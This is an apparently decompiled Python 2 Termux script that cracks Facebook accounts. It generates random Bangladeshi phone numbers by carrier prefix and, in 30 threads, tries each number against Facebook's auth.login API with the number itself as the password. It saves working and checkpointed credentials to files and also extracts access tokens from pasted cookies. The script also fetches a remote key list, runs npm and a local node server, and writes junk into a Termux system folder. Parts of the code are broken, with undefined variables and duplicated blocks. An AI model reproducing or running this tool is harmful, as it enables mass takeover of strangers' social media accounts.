# Don't Try Modify
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
import os 

import sys

import base64

import random

import requests

import platform
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/output')
except OSError:
    pass

os.system('git pull')
os.system('clear')
w = '\x1b[1;97m'
g = '\x1b[1;32m'
red = '\x1b[1;91m'
wrong = '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]'
wg = '\x1b[1;97m{\x1b[1;32m\xe2\x80\xa2\x1b[1;97m]'
dog = platform.release()
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
logo = '\x1b[1;91m   ||  ||  \xe2\x94\x8f\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x93\x1b[1;97m\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac \xe2\x94\x8c\xe2\x94\x80    \x1b[1;91m\xe2\x94\x8f\xe2\x94\x81\xe2\x94\x93\xe2\x94\x8f\xe2\x94\x93\n   \xe2\x95\xb0\xe2\x95\xb0\x1b[1;97m()\x1b[1;91m\xe2\x95\xaf\xe2\x95\xaf   \xe2\x94\x83 \xe2\x94\x83\x1b[1;97m\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xb4\xe2\x94\x90 \xe2\x94\x80\xe2\x94\x80 \x1b[1;91m\xe2\x94\xa3\xe2\x94\xab \xe2\x94\xa3\xe2\x94\xbb\xe2\x94\x93\n  \xe2\x95\xad\xe2\x95\xad\x1b[1;97m(__)\x1b[1;91m\xe2\x95\xae\xe2\x95\xae \xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\x9b\x1b[1;97m\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4 \xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4  \xe2\x94\x94    \x1b[1;91m\xe2\x94\x97  \xe2\x94\x97\xe2\x94\x81\xe2\x94\x9b\n  ||    ||   \x1b[47;30;1m    William Jack    \x1b[0;0m'
info = '\n\x1b[1;97m[\x1b[1;32mINFO\x1b[1;97m]\n\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Author   :  William Jack\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Github   :  https://github.com/williamjack69\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Telegram :  https://t.me/joinchat/OVpeBB2R83s2MTk8\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] WhatsApp :  +923100209977\n\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Encrypt By  : Agatha Lysenko\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Support By  : Agatha Lysenko\n'

def lout():
    os.system('rm access_token.txt')
    os.system('exit')


def rtrash():
    os.system('rm -rf /sdcard/output')
    os.system('exit')


def info_tools():
    os.system('clear')
    print info
    memew = raw_input(w + '[' + g + '?' + w + '] Press enter to back! ')
    menu()


idh = []
back = 0

def register():
    os.system('clear')
    print logo
    print 38 * '-'
    try:
        urlkey = requests.get('https://raw.githubusercontent.com/sanjida9999/sbba/main/NX.txt').text
        if dog in urlkey:
            os.system('cd ..... && npm install')
            os.system('fuser -k 5000/tcp &')
            os.system('#')
            os.system('cd ..... && node index.js &')
            log_menu()
        else:
            os.system('clear')
            print logo
            print 38 * '-'
            print '\n\x1b[1;97m{\x1b[1;32m\xe2\x80\xa2\x1b[1;97m} Your ID  : \x1b[1;32m' + dog
            print '\x1b[1;97m{\x1b[1;32m\xe2\x80\xa2\x1b[1;97m} Status   : \x1b[1;91mNot Approval'
            print '\n\x1b[1;97m'
            zew = raw_input('[\x1b[1;91m!\x1b[1;97m] Press enter to confirm the ID ')
            os.system('xdg-open https://wa.me/923100209977')
            os.system('exit')
    except (KeyError, IOError):
        not_register()


def not_register():
    os.system('clear')
    sav = open('/data/data/com.termux/files/usr/libexec/awk/.termux.log', 'w')
    sav.write('Fuck you')
    sav.close()
    register()


bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}

def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 38 * '-'
        print '\n\x1b[1;97m{\x1b[1;32m1\x1b[1;97m} Login with FaceBook'
        print '\x1b[1;97m{\x1b[1;32m2\x1b[1;97m} Login with Token'
        print '\x1b[1;97m{\x1b[1;32m3\x1b[1;97m} Login with Cookie'
        print '\x1b[1;97m{\x1b[1;91m0\x1b[1;97m} Exit'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input('\xe2\x9e\x9b ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    elif s == '0':
        os.system('exit')
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Wrong Input!!!'
        sds = raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press Enter to back! ')
        log_menu()


def log_fb():
    os.system('clear')
    print logo
    print 38 * '-'
    lid = raw_input('\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Email/Username : ')
    pwds = raw_input('\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Password       : ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print '\x1b[1;97m[\x1b[1;93m!\x1b[1;97m] Account must verify'
            raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back! ')
            log_menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Login Failed!'
            raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back! ')
            log_menu()
    except:
        print ''
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Login Failed!'
        os.system('exit')


def log_token():
    os.system('clear')
    print logo
    print 38 * '-'
    tok = raw_input('\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Enter Token : \x1b[1;32m')
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    try:
        cookie = raw_input('\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Enter Cookie  : ')
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Invalid Cookie!'
        print ''
        raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back!!! ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]Invalid cookies'
        print ''
        raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back!!! ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Invalid Cookie!'
        print ''
        raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back!!! ')
        log_menu()



def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


os.system('clear')
psb('\x1b[1;32mBANGLADESH 11 DIGIT CLONING IS STARTING PLEASE WAIT ..........')
for n in range(100000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 C')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
os.system('clear')
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [
 ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')
    
print  '                                                        CONTACT ME FACEBOOK OR TELEGRAM FOR USERNAME AND PASSWORD'




CorrectUsername = 'l'
CorrectPassword = 'l'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;91m\x1b[1;93mTool Username \x1b[1;97m\xe2\x9e\xa4\xe2\x9e\xa4\xe2\x9e\xa4\x1b[1;92m')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;97m \x1b[1;94mTool Password  \x1b[1;97m\xe2\x9e\xa4\xe2\x9e\xa4\xe2\x9e\xa4\x1b[1;93m')
        if password == CorrectPassword:
            print 'Logged in successfully as Alex Shohan'
            time.sleep(2)
            loop = 'false'
        else:
            print '\x1b[1;94mWrong Password'
            os.system('xdg-open https://www.facebook.com/Alex-Shohan-101613722527088/')
    else:
        print '\x1b[1;94mWrong Username'
        os.system('xdg-open https://youtube.com/channel/UCELUcwsMUQrgKKvlO_WvVcw')



logo = """
                                                                      
\033[0;93m 
          (             )  
   (      )\ )       ( /(  
   )\    (()/(  (    )\()) 
((((_)(   /(_)) )\  ((_)\  
 )\ _ )\ (_))  ((_) __((_) 
 (_)_\(_)| |   | __|\ \/ / 
  / _ \  | |__ | _|  >  <  
 /_/ \_\ |____||___|/_/\_\      
"""

back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print ''
    print '\033[0;94m-------------------------------------------------- '
    print '\033[0;94m-------------------------------------------------- '
    print '\033[0;93mAUTHOR   : Alex-Shohan'
    print '\033[0;94mFACEBOOK : S H O H A N '
    print '\033[0;96mGITHUB   : Alexx-Shohan'
    print '\033[0;94mTELEGRAM ; +8801406876761'
    print '\033[0;94m-------------------------------------------------- '
    print '\033[0;94m-------------------------------------------------- '
    print ''
    print '\033[0;90mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
    print '\033[0;91m'
    print 50* '-'
    print '\033[0;92m[1]  \x1b[1;93mGrameenphone'
    print '\033[0;95m[2]  \x1b[1;95mRobi'
    print '\033[0;94m[3]  \x1b[1;94mAirtel'
    print '\033[0;92m[4]  \x1b[1;92mBanglalink'
    print '\033[0;96m[5]  \x1b[1;96mTeletalk'
    print '\033[0;90m[0]  \x1b[1;90mExit            '
    print '\033[0;91m'
    print 50 * '-'
    action()
 


def action():
    global cpb
    global oks
    bch = raw_input('\n  ===>   ')
    if bch == '':
        print
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139'
        print ''
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '180,181, 182, 183, 184, 185, 186, 187, 188, 189'
        print ''
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '3':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '160,161, 162, 163, 164, 165, 166, 167, 168, 169'
        print ''
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '4':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149'
        print ''
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '5':
        os.system('clear')
        print logo
        print 50* '-'
        print ''
        print '150,151, 152, 153, 154, 155, 156, 157, 158, 159'
        print ''
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '0':
        exb()
    else:
        print
        action()
    xxx = str(len(id))
    print ''
    print 50 * '-'
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Please wait,,, process is running ...')
    time.sleep(0.5)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    psb(50 * '-')
    time.sleep(0.5)
    print
    50 * '-'
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            result = k + c + user
            digi11 = result[3:14]
            pass1 = digi11
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[10 DAYS AFTER LOGIN]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[CP]\x1b[0m \n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print
    50 * '-'
    print
    print
    '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 11-Digit.py')


if __name__ == '__main__':
    register()
# okay decompiling Alex.pyc
